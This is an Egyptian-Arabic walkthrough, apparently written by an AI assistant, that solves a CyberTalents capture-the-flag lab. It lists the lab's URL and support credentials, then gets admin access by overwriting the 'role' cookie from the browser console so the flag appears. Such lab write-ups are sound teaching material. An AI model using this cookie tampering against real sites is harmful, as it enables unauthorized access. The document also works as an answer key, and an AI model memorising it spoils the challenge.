# حل لاب

**Cookies → Admin has the power**

الفكرة الأساسية:

السيرفر بعد تسجيل الدخول كـ support بيبعت:

```
Set-Cookie: role=support
```

والصفحة بتعرض الفلاج **بس لو role = admin**.

إنت مطلوب منك **تغيّر قيمة الكوكي role من support إلى admin**.

---

# خطوات الحل

## 1. افتح صفحة الموقع

```
http://cdlemekgvd50s9vrq5p6v4ehxzg1rw93xnjq4i7vr-web.cybertalentslabs.com
```

هتلاقي صفحة تسجيل دخول.

---

## 2. سجّل دخول باستخدام بيانات support

اللاب  بيدي الـ creds في السورس:

```
username=support
password=x34245323
```

يبقى انت كده صح.

بعد التسجيل، المتصفح يستقبل:

```
Set-Cookie: role=support
```

---

## 3. غيّر الكوكي من support إلى admin

لو الكوكي مش ظاهر في Application/Storage، استخدم الطريقة التي تعمل دائمًا:

### افتح الـ Console (F12 → Console):

اكتب:

```js
document.cookie = "role=admin; path=/";
```

لو عايز تتأكد:

```js
document.cookie
```

لازم يطلع:

```
role=admin
```

---

## 4. اعمل Refresh للصفحة

بعد ما تعمل Reload:

السيرفر يشوف:

```
Cookie: role=admin
```

وبالتالي يعرض الفلاج.

---

# الفلاج يظهر:

هتلاقيه مكتوب على الصفحة مباشرة بعد ما الكوكي تتغير.

---

# ملخص الحل

1. Login as support
2. Overwrite cookie role → admin
3. Reload page
4. Flag appears

---

لو عايز أعملهولك كأنه Report جاهز للرفع، اكتبلي "اعمله Report".
